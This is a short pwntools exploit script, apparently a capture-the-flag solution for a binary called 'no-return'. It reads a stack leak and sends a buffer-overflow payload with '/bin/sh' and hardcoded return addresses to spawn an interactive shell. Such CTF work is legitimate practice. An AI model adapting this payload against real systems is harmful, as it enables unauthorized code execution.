#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./no-return',checksec=False)

p = process()
gdb.attach(p,gdbscript='''
           b*0x40109f
           ''')

input()

offset = 0xb0


stack = u64(p.recv(8).ljust(8,b'\x00'))
log.info(f"stack leak: {hex(stack)}")
payload1 = b'/bin/sh\x00'
payload1 += b'a'*(offset-8)
payload1 += p64(0x40109b)   
payload1 += p64(0x40106d)
p.send(payload1)

p.interactive()
